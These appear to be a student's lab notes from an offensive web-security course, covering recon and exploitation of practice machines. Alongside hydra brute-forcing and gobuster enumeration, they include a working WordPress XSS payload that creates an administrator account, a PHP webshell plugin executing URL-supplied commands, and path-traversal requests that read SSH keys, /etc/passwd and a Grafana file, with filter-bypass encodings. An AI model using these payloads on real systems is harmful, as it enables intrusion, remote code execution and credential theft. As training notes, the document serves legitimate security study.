# Week 2

## nmap http-enum
```bash
sudo nmap -p80  -sV 192.168.50.20
sudo nmap -p80 --script=http-enum 192.168.50.20
```

## Wappalyzer
not gonna use as it requires registration, there are nmap scripts that can provide similar intelligence.
- 

## gobuster
great for finding hidden directories and files on web servers. It uses a wordlist to brute-force URLs and can help identify potential entry points for further exploration.

```bash
gobuster dir -u 192.168.50.20 -w /usr/share/wordlists/dirb/common.txt -t 5
```

## burpsuite
Burp Suite is a powerful web application security testing tool. It can be used to intercept and analyze HTTP requests and responses, perform automated scans, and identify vulnerabilities in web applications. It is particularly

Intruder does similar to gobuster but with more options and flexibility. It allows for customized payloads, attack types, and can be used for fuzzing and brute-forcing.

To get SSL traffic to work with burp, you need to install the burp certificate on your browser. You can download it from http://burp and then import it into your browser's certificate store.
Dont forget to setup the proxy in your browser to point to burp (usually localhost:8080).

Default behavior of burp is to intercept html requests, but you can change this in the settings to intercept all requests. This is useful for testing APIs and other non-HTML traffic.

Some web applications will include their hostname in links and redirects. If we don't have an entry in /etc/hosts that matches the web application's hostname, our browser and other tools may not be able to follow these links.

This allows us to access the VM by hostname while bypassing DNS.

kali@kali:~$ cat /etc/hosts 
...
192.168.50.16 offsecwp

## hydra
```bash
hydra -l admin -P passwords.txt 192.168.197.52 http-post-form "/login.php:username=^USER^&password=^PASS^:F=Login Failed"

Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-06-24 08:10:16
[DATA] max 16 tasks per 1 server, overall 16 tasks, 30 login tries (l:1/p:30), ~2 tries per task
[DATA] attacking http-post-form://192.168.197.52:80/login.php:username=^USER^&password=^PASS^:F=Login Failed
[80][http-post-form] host: 192.168.197.52   login: admin   password: zeddemore
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-06-24 08:10:17
```

## api enumeration using gobuster
create pattern
```bash
cat pattern                                
{GOBUSTER}/v1
{GOBUSTER}/v2
```
run gobuster with pattern
```bash
gobuster dir -u http://192.168.197.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.197.16:5002
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Patterns:                pattern (2 entries)
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/books/v1             (Status: 200) [Size: 235]
/users/v1             (Status: 200) [Size: 316]
Progress: 40938 / 40938 (100.00%)
===============================================================
Finished
===============================================================
```
curl to check endpoint
```bash                                                                                                                                                                                                                   
┌──(kali㉿kali)-[~/offsec/8.2.4]
└─$ curl -i http://192.168.197.16:5002/users/v1                                
HTTP/1.0 200 OK
Content-Type: application/json
Content-Length: 316
Server: Werkzeug/1.0.1 Python/3.7.13
Date: Wed, 24 Jun 2026 13:19:35 GMT

{
  "users": [
    {
      "email": "mail1@mail.com", 
      "username": "name1"
    }, 
    {
      "email": "mail2@mail.com", 
      "username": "name2"
    }, 
    {
      "email": "admin@mail.com", 
      "username": "admin"
    }, 
    {
      "email": "pwn@offsec.com", 
      "username": "offsec"
    }
  ]
}

```

find sub endpoints:
```bash
gobuster dir -u http://192.168.197.16:5002/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.197.16:5002/users/v1/admin/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/email                (Status: 405) [Size: 142]
/password             (Status: 405) [Size: 142]
Progress: 959 / 959 (100.00%)
===============================================================
Finished
===============================================================
```

## XSS priv esc wordpress visitor plugin
we need to first gather the nonce. We can accomplish this using the following JavaScript function:

```js
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];
```

```js
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);

```
minimize this and using the following function make sure to replace any bad characters.
```js
function encode_to_javascript(string) {
            var input = string
            var output = '';
            for(pos = 0; pos < input.length; pos++) {
                output += input.charCodeAt(pos);
                if(pos != (input.length - 1)) {
                    output += ",";
                }
            }
            return output;
        }
        
let encoded = encode_to_javascript('insert_minified_javascript')
console.log(encoded)
```


minimize js and put in useragent
run the exploit like so:
```bash
curl -i http://offsecwp --user-agent "<script>eval(String.fromCharCode(118,97,114,32,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,44,114,101,113,117,101,115,116,85,82,76,61,34,47,119,112,45,97,100,109,105,110,47,117,115,101,114,45,110,101,119,46,112,104,112,34,44,110,111,110,99,101,82,101,103,101,120,61,47,115,101,114,34,32,118,97,108,117,101,61,34,40,91,94,34,93,42,63,41,34,47,103,59,97,106,97,120,82,101,113,117,101,115,116,46,111,112,101,110,40,34,71,69,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,49,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,41,59,118,97,114,32,110,111,110,99,101,77,97,116,99,104,61,110,111,110,99,101,82,101,103,101,120,46,101,120,101,99,40,97,106,97,120,82,101,113,117,101,115,116,46,114,101,115,112,111,110,115,101,84,101,120,116,41,44,110,111,110,99,101,61,110,111,110,99,101,77,97,116,99,104,91,49,93,44,112,97,114,97,109,115,61,34,97,99,116,105,111,110,61,99,114,101,97,116,101,117,115,101,114,38,95,119,112,110,111,110,99,101,95,99,114,101,97,116,101,45,117,115,101,114,61,34,43,110,111,110,99,101,43,34,38,117,115,101,114,95,108,111,103,105,110,61,97,116,116,97,99,107,101,114,38,101,109,97,105,108,61,97,116,116,97,99,107,101,114,64,111,102,102,115,101,99,46,99,111,109,38,112,97,115,115,49,61,97,116,116,97,99,107,101,114,112,97,115,115,38,112,97,115,115,50,61,97,116,116,97,99,107,101,114,112,97,115,115,38,114,111,108,101,61,97,100,109,105,110,105,115,116,114,97,116,111,114,34,59,40,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,41,46,111,112,101,110,40,34,80,79,83,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,48,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,116,82,101,113,117,101,115,116,72,101,97,100,101,114,40,34,67,111,110,116,101,110,116,45,84,121,112,101,34,44,34,97,112,112,108,105,99,97,116,105,111,110,47,120,45,119,119,119,45,102,111,114,109,45,117,114,108,101,110,99,111,100,101,100,34,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,112,97,114,97,109,115,41,59))</script>" --proxy 127.0.0.1:8080
```



then we can use the new user to upload a plugin (based on https://www.revshells.com/):
https://jckhmr.net/create-a-wordpress-webshell-plugin/

```php
<?php
/**
* Plugin Name: WonderfulWebshell
* Plugin URI: https://github.com/jckhmr/wonderfullwebshell
* Description: Wordpress webshell used for demo purposes only
* Version: 1.0
* Author: jckhmr
* Author URI: https://jckhmr.net
* License: https://nosuchlicense
*/

if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
```

zip it and upload and then you can access it like so: `curl -i 'http://offsecwp/wp-content/plugins/mylovelywebshell/mylovelywebshell.php?cmd=cat%20/tmp/flag'`

## Dir traversal
Basic path traversal to find private key:
```bash
curl http://mountaindesserts.local/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa
```

Use the found private key to ssh into the box:
```bash
ssh -i dt_key -p 2222 offsec@mountaindesserts.local
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 for '/home/kali/dt_key' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
```
Fix the permissions on the private key file and try again:
```bash
chmod 400 dt_key
ssh -i dt_key -p 2222 offsec@mountaindesserts.local
```


Windows grafana has a path traversal vulnerability in the mysql plugin. We can use this to read files on the system.
```bash

└─$ curl -v --path-as-is http://192.168.107.193:3000/public/plugins/mysql/../../../../../../../../Users/install.txt              
*   Trying 192.168.107.193:3000...
* Established connection to 192.168.107.193 (192.168.107.193 port 3000) from 192.168.45.157 port 48344 
* using HTTP/1.x
> GET /public/plugins/mysql/../../../../../../../../Users/install.txt HTTP/1.1
> Host: 192.168.107.193:3000
> User-Agent: curl/8.17.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Accept-Ranges: bytes
< Cache-Control: no-cache
< Content-Length: 38
< Content-Type: text/plain; charset=utf-8
< Expires: -1
< Last-Modified: Wed, 29 Jul 2026 16:37:22 GMT
< Pragma: no-cache
< X-Content-Type-Options: nosniff
< X-Frame-Options: deny
< X-Xss-Protection: 1; mode=block
< Date: Wed, 29 Jul 2026 16:48:39 GMT
< 
OS{e13320f6255ce84d841d0155bbe2e41a}
* Connection #0 to host 192.168.107.193:3000 left intact
```

### Bypassing path traversal filters
Some web applications may implement filters to prevent path traversal attacks. However, there are techniques to bypass these filters. For example, if the application blocks the use of "../" in the URL, you can try using URL encoding or double encoding to bypass the filter. For example, you can replace "../" with "%2e%2e%2f" or "%252e%252e%2f". Additionally, you can try using alternative directory traversal sequences, such as "..%2f" or "..%5c" (for Windows systems). 

```bash
curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```